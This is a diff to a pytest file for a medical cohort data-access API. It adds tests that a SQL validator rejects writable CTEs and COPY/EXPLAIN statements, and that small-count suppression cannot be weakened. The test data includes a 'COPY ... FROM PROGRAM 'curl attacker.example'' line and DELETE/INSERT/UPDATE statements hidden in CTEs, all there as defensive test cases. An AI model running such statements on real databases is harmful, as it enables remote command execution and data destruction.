@@ -14,10 +14,12 @@ from unittest.mock import patch
 
 import pandas as pd
 import pytest
+import sqlglot
 from fastapi import HTTPException
 from pandas.errors import DatabaseError as PandasDatabaseError
 from psycopg2 import errors as pg_errors
 from sqlalchemy.exc import DBAPIError, SQLAlchemyError
+from sqlglot import exp
 
 from data_access_api.routers.schema import CohortQueryInput
 from data_access_api.services.cohort import (
@@ -113,10 +115,13 @@ def test_get_statistics_below_threshold(mock_read_sql, mock_df_below_threshold):
     assert stats.suppressed is True
 
 
-@patch("data_access_api.services.cohort.COHORT_QUERY_THRESHOLD", 10)
 @patch("pandas.read_sql")
 def test_get_statistics_fails_global_threshold(mock_read_sql):
-    """Record count above caller threshold but below the global threshold also returns 0."""
+    """Record count above caller threshold but below the configured threshold also returns 0.
+
+    The configured ``COHORT_QUERY_THRESHOLD`` (10 by default) is a floor: a caller passing a
+    lower value cannot weaken suppression.
+    """
     # Create a dataframe with 8 records (between 5 and 10)
     mock_df_medium = pd.DataFrame({
         "modality": ["CT"] * 8,
@@ -134,8 +139,8 @@ def test_get_statistics_fails_global_threshold(mock_read_sql):
         trust_id="mock_trust",
     )
 
-    # Pass a low threshold (5) so the first check (record_count < threshold) passes (8 < 5 is False)
-    # but the global check (len(df) < COHORT_QUERY_THRESHOLD) fails (8 < 10 is True).
+    # Pass a low threshold (5): on its own 8 would clear it, but the configured floor of 10
+    # is applied underneath, so 8 < 10 suppresses.
     stats = get_statistics(mock_df_medium, query_input, threshold=5)
     assert stats.record_count == 0
     assert stats.data == []
@@ -413,8 +418,23 @@ def test_get_records_pandas_error_without_dbapi_cause(mock_read_sql):
     ],
 )
 def test_validate_query_accepts_well_formed_select(query: str):
-    """Plain SELECT (with or without omop qualification, CTE, or UNION) is accepted."""
-    assert validate_query(query) is True
+    """Plain SELECT (with or without omop qualification, CTE, or UNION) is accepted.
+
+    Asserts the emit contract, not just truthiness: the return value is the query
+    re-emitted from the validated AST, and it is what callers hand to the engine — so
+    it must be a non-empty string that still parses back to a SELECT-shaped statement.
+    """
+    emitted = validate_query(query)
+
+    assert isinstance(emitted, str)
+    assert emitted.strip()
+    # A trailing semicolon in the input must not survive into the emitted SQL, which is
+    # composed into a subquery by /cohort/accession-ids.
+    assert ";" not in emitted
+
+    reparsed = sqlglot.parse(emitted, read="postgres")
+    assert len(reparsed) == 1
+    assert isinstance(reparsed[0], (exp.Select, exp.Union, exp.Intersect, exp.Except))
 
 
 @pytest.mark.parametrize(
@@ -441,6 +461,33 @@ def test_validate_query_rejects_garbage_that_parses_as_non_select():
     """Garbage that sqlglot loosely parses (e.g. ``INVALID SQL`` → Alias) still must be rejected."""
     with pytest.raises(HTTPException, match="Only SELECT statements are allowed"):
         validate_query("INVALID SQL")
+
+
+@pytest.mark.parametrize(
+    "query",
+    [
+        "WITH x AS (DELETE FROM omop.person RETURNING *) SELECT * FROM x",
+        "WITH x AS (INSERT INTO omop.person (person_id) VALUES (1) RETURNING *) SELECT * FROM x",
+        "WITH x AS (UPDATE omop.person SET person_id = 1 RETURNING *) SELECT * FROM x",
+        # Nested one level deeper — the walk must reach it, not just the top-level CTE list.
+        "WITH x AS (WITH y AS (DELETE FROM omop.person RETURNING *) SELECT * FROM y) SELECT * FROM x",
+    ],
+)
+def test_validate_query_rejects_data_modifying_cte(query: str):
+    """Postgres allows a writable CTE, and sqlglot parses the whole thing as a top-level
+    ``Select`` — so the SELECT-shape check alone lets it through. The walk must catch it.
+
+    Defence in depth rather than the only barrier: ``data_analyst_reader`` has no write
+    grant, so Postgres would reject these too. But the validator claims to reject writes,
+    and it should actually do so.
+    """
+    with pytest.raises(HTTPException, match="Data-modifying statements are not allowed"):
+        validate_query(query)
+
+
+def test_validate_query_still_accepts_read_only_cte():
+    """The DML walk must not catch an ordinary read-only CTE."""
+    assert validate_query("WITH p AS (SELECT * FROM omop.person) SELECT * FROM p")
 
 
 @pytest.mark.parametrize(
@@ -490,12 +537,23 @@ def test_validate_query_rejects_oversized_query():
         "CREATE TABLE foo (id int)",
         "ALTER TABLE omop.person ADD COLUMN col int",
         "TRUNCATE omop.person",
+        # COPY and EXPLAIN are named by rule 3 of the validate_query docstring but were
+        # previously untested. sqlglot parses them successfully — to exp.Copy and to the
+        # catch-all exp.Command respectively — so neither is caught by the parse step; both
+        # are rejected purely because the allowlist admits only SELECT-shaped top-level nodes.
+        "COPY (SELECT 1) TO STDOUT",
+        "COPY omop.person FROM PROGRAM 'curl attacker.example'",
+        "EXPLAIN SELECT * FROM omop.person",
     ],
 )
 def test_validate_query_rejects_non_select_statements(query: str):
     """
     Non-SELECT statements are rejected at the API layer even though Postgres
     rejects them too — data_analyst_reader has no DDL/DML privileges.
+
+    The COPY and EXPLAIN cases are characterisation tests: they lock in behaviour the
+    allowlist already provides, so a future widening of ``_ALLOWED_QUERY_TYPES`` that let
+    either through fails here rather than silently contradicting the docstring.
     """
     with pytest.raises(HTTPException, match="Only SELECT statements are allowed"):
         validate_query(query)
@@ -1030,6 +1088,25 @@ def test_make_other_category_custom_min_count():
     ]
 
     assert result == expected
+
+
+@patch("data_access_api.services.cohort.get_settings")
+def test_make_other_category_defaults_to_configured_threshold(mock_get_settings):
+    """Omitting min_count resolves COHORT_QUERY_THRESHOLD at call time.
+
+    Resolving in the body rather than as a default argument is what lets a per-trust override
+    apply: a default argument would bind the value once at import.
+    """
+    mock_get_settings.return_value.COHORT_QUERY_THRESHOLD = 20
+    results = [
+        {"value": "A", "count": 25},
+        {"value": "B", "count": 15},  # Below the configured 20, so grouped
+    ]
+
+    assert make_other_category(results) == [
+        {"value": "A", "count": 25},
+        {"value": "Other", "count": 15},
+    ]
 
 
 # Additional integration tests for get_statistics with the new helper functions
